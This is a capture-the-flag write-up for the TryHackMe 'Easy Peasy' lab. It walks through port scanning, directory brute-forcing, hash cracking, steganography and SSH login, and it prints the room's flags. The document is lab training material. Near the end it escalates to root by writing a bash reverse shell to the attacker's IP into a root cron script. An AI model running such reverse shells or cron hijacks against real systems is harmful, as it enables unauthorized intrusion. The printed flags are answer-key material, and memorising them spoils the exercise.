---
title: "TryHackMe - Easy Peasy"
categories:
  - Writeup
tags:
  - writeup
  - tryhackme
  - enumerate
  - cracking hash
  - cron
---
Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

## Enumeration through Nmap
Scan all ports with aggressive mode.

```bash
$ rustscan -a 10.10.65.41 --ulimit 10000 -- -A -v -sC -sV 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.65.41:80
Open 10.10.65.41:6498
Open 10.10.65.41:65524
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 06:35 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:35
Completed NSE at 06:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:35
Completed NSE at 06:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:35
Completed NSE at 06:35, 0.00s elapsed
Initiating Ping Scan at 06:35
Scanning 10.10.65.41 [2 ports]
Completed Ping Scan at 06:35, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:35
Completed Parallel DNS resolution of 1 host. at 06:36, 13.00s elapsed
DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 06:36
Scanning 10.10.65.41 [3 ports]
Discovered open port 80/tcp on 10.10.65.41
Discovered open port 65524/tcp on 10.10.65.41
Discovered open port 6498/tcp on 10.10.65.41
Completed Connect Scan at 06:36, 0.19s elapsed (3 total ports)
Initiating Service scan at 06:36
Scanning 3 services on 10.10.65.41
Completed Service scan at 06:36, 11.59s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.65.41.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 6.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:36
Completed NSE at 06:36, 0.00s elapsed
Nmap scan report for 10.10.65.41
Host is up, received conn-refused (0.19s latency).
Scanned at 2021-02-06 06:35:55 EST for 32s

PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack nginx 1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf5hzG6d/mEZZIeldje4ZWpwq0zAJWvFf1IzxJX1ZuOWIspHuL0X0z6qEfoTxI/o8tAFjVP/B03BT0WC3WQTm8V3Q63lGda0CBOly38hzNBk8p496scVI9WHWRaQTS4I82I8Cr+L6EjX5tMcAygRJ+QVuy2K5IqmhY3jULw/QH0fxN6Heew2EesHtJuXtf/33axQCWhxBckg1Re26UWKXdvKajYiljGCwEw25Y9qWZTGJ+2P67LVegf7FQu8ReXRrOTzHYL3PSnQJXiodPKb2ZvGAnaXYy8gm22HMspLeXF2riGSRYlGAO3KPDcDqF4hIeKwDWFbKaOwpHOX34qhJz
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8/fLeNoGv6fwAVkd9oVJ7OIbn4117grXfoBdQ8vY2qpkuh30sTk7WjT+Kns4MNtTUQ7H/sZrJz+ALPG/YnDfE=
|   256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNgw/EuawEJkhJk4i2pP4zHfUG6XfsPHh6+kQQz3G1D
65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 3 ports open, the nginx version is 1.16.1, and Apache is running on the highest port.

## Compromising the machine
- Using GoBuster, find flag 1.

  Enumerate on port 80.

  ```bash
  $ gobuster dir -u 10.10.82.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,jpg,png,html,css,jpeg,txt,conf,ini,bak,swp,db
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.82.82
  [+] Threads:        100
  [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Extensions:     jpeg,ini,db,php,png,html,conf,bak,swp,jpg,css,txt
  [+] Timeout:        10s
  ===============================================================
  2021/02/06 11:06:38 Starting gobuster
  ===============================================================
  /index.html (Status: 200)
  /robots.txt (Status: 200)
  /hidden (Status: 301)
  ```

  Let's check the `/hidden` page.

  <a href="/assets/images/tryhackme/easy-peasy/7.png"><img src="/assets/images/tryhackme/easy-peasy/7.png"></a>

  Nothing :/. Let's enumerate the `/hidden` page.

  ```bash
  $ gobuster dir -u 10.10.82.82/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,jpg,png,html,css,jpeg,txt,conf,ini,bak,swp,db
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.82.82/hidden
  [+] Threads:        100
  [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Extensions:     png,html,css,ini,bak,swp,php,jpg,jpeg,txt,conf,db
  [+] Timeout:        10s
  ===============================================================
  2021/02/06 11:12:21 Starting gobuster
  ===============================================================
  /index.html (Status: 200)
  /whatever (Status: 301)
  ```

  Let's check the `/hidden/whatever` page.

  <a href="/assets/images/tryhackme/easy-peasy/8.png"><img src="/assets/images/tryhackme/easy-peasy/8.png"></a>

  Let's check the source code.

  <a href="/assets/images/tryhackme/easy-peasy/9.png"><img src="/assets/images/tryhackme/easy-peasy/9.png"></a>

  Decode the encoded string.

  ```bash
  $ echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
  flag{f1rs7_fl4g}
  ```

- Further enumerate the machine, what is flag 2?

  Checking `robots.txt` file.

  <a href="/assets/images/tryhackme/easy-peasy/10.png"><img src="/assets/images/tryhackme/easy-peasy/10.png"></a>

  We got like a hash user-agent. Let's crack it out.

  <a href="/assets/images/tryhackme/easy-peasy/11.png"><img src="/assets/images/tryhackme/easy-peasy/11.png"></a>


- Crack the hash with easypeasy.txt, What is the flag 3?

  We can find the flag 3 on port 65524 at the apache2 default welcome page.

  <a href="/assets/images/tryhackme/easy-peasy/1.png"><img src="/assets/images/tryhackme/easy-peasy/1.png"></a>

- What is the hidden directory?

  Check the source code and we wil find the encoded string.

  <a href="/assets/images/tryhackme/easy-peasy/2.png"><img src="/assets/images/tryhackme/easy-peasy/2.png"></a>

  Decode the string with Base62 encoding.

  <a href="/assets/images/tryhackme/easy-peasy/3.png"><img src="/assets/images/tryhackme/easy-peasy/3.png"></a>

- Using the wordlist that provided to you in this task crack the hash<br>what is the password?

  Let's visit the hidden directory first.

  <a href="/assets/images/tryhackme/easy-peasy/4.png"><img src="/assets/images/tryhackme/easy-peasy/4.png"></a>

  Check the source code and we will find the hash.

  <a href="/assets/images/tryhackme/easy-peasy/5.png"><img src="/assets/images/tryhackme/easy-peasy/5.png"></a>

  Let's crack it.

  ```bash
  $ john --wordlist=custom_wordlist.txt hash             
  Warning: detected hash type "gost", but the string is also recognized as "HAVAL-256-3"
  Use the "--format=HAVAL-256-3" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "Panama"
  Use the "--format=Panama" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "po"
  Use the "--format=po" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "Raw-Keccak-256"
  Use the "--format=Raw-Keccak-256" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "Raw-SHA256"
  Use the "--format=Raw-SHA256" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "skein-256"
  Use the "--format=skein-256" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "Snefru-256"
  Use the "--format=Snefru-256" option to force loading these as that type instead
  Warning: detected hash type "gost", but the string is also recognized as "Stribog-256"
  Use the "--format=Stribog-256" option to force loading these as that type instead
  Using default input encoding: UTF-8
  Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
  Will run 6 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  mypasswordforthatjob (?)
  1g 0:00:00:00 DONE (2021-02-06 10:59) 100.0g/s 460800p/s 460800c/s 460800C/s vgazoom4x..fish20
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed
  ```

- What is the password to login to the machine via SSH?

  I see bunch of 1 and 0 on the picture on `/n0th1ng3ls3m4tt3r`.

  <a href="/assets/images/tryhackme/easy-peasy/12.png"><img src="/assets/images/tryhackme/easy-peasy/12.png"></a>

  I tried to decode it from binary but didn't worked. So, let's download the picture and do some steganography.

  ```bash
  $ steghide extract -sf index.jpeg                                                                                                                                      1 ⨯
  Enter passphrase: 
  wrote extracted data to "secrettext.txt".
  ```

  We got something using the password `mypasswordforthatjob`. Let's `cat` it out.

  ```bash
  $ cat secrettext.txt  
  username:boring
  password:
  01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
  ```

  Binary again :/. Let's decode it.

  <a href="/assets/images/tryhackme/easy-peasy/13.png"><img src="/assets/images/tryhackme/easy-peasy/13.png"></a>

- What is the user flag?

  SSH to the machine.

  ```bash
  $ ssh boring@10.10.82.82 -p 6498 
  The authenticity of host '[10.10.82.82]:6498 ([10.10.82.82]:6498)' can't be established.
  ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '[10.10.82.82]:6498' (ECDSA) to the list of known hosts.
  *************************************************************************
  **        This connection are monitored by government offical          **
  **            Please disconnect if you are not authorized              **
  ** A lawsuit will be filed against you if the law is not followed      **
  *************************************************************************
  boring@10.10.82.82's password: 
  You Have 1 Minute Before AC-130 Starts Firing
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  !!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
  You Have 1 Minute Before AC-130 Starts Firing
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  !!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
  boring@kral4-PC:~$
  ```

  User.txt:

  ```bash
  boring@kral4-PC:~$ cat user.txt 
  User Flag But It Seems Wrong Like It`s Rotated Or Something
  synt{a0jvgf33zfa0ez4y}
  ```

  Decode it from caesar cipher.

  <a href="/assets/images/tryhackme/easy-peasy/14.png"><img src="/assets/images/tryhackme/easy-peasy/14.png"></a>

- What is the root flag?

  Checking crontab.

  ```bash
  boring@kral4-PC:~$ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.

  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  #
  * *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
  ```

  Let's check the file.

  ```bash
  boring@kral4-PC:~$ cd /var/www
  boring@kral4-PC:/var/www$ ls -la
  total 16
  drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
  drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
  drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
  -rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
  boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
  #!/bin/bash
  # i will run as root
  ```

  Since we are the owner of the file, let's send a reverse shell to the file.

  ```bash
  boring@kral4-PC:/var/www$ echo 'bash -i >& /dev/tcp/10.11.25.205/1111 0>&1' > .mysecretcronjob.sh
  ```
  
  Set up our `netcat` listener and wait for the job to run.

  ```bash
  $ nc -lnvp 1111       
  listening on [any] 1111 ...
  connect to [10.11.25.205] from (UNKNOWN) [10.10.82.82] 32872
  bash: cannot set terminal process group (1641): Inappropriate ioctl for device
  bash: no job control in this shell
  root@kral4-PC:/var/www# 
  ```

  Root.txt:

  ```bash
  root@kral4-PC:/var/www# cd /root
  cd /rootl
  root@kral4-PC:~# s
  ls
  root@kral4-PC:~# ls -la
  ls -la
  total 40
  drwx------  5 root root 4096 Jun 15  2020 .
  drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
  -rw-------  1 root root    2 Feb  6 09:15 .bash_history
  -rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
  drwx------  2 root root 4096 Jun 13  2020 .cache
  drwx------  3 root root 4096 Jun 13  2020 .gnupg
  drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
  -rw-r--r--  1 root root  148 Aug 17  2015 .profile
  -rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
  -rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
  root@kral4-PC:~# cat .root.txt
  cat .root.txt
  flag{63a9f0ea7bb98050796b649e85481845}
  ```
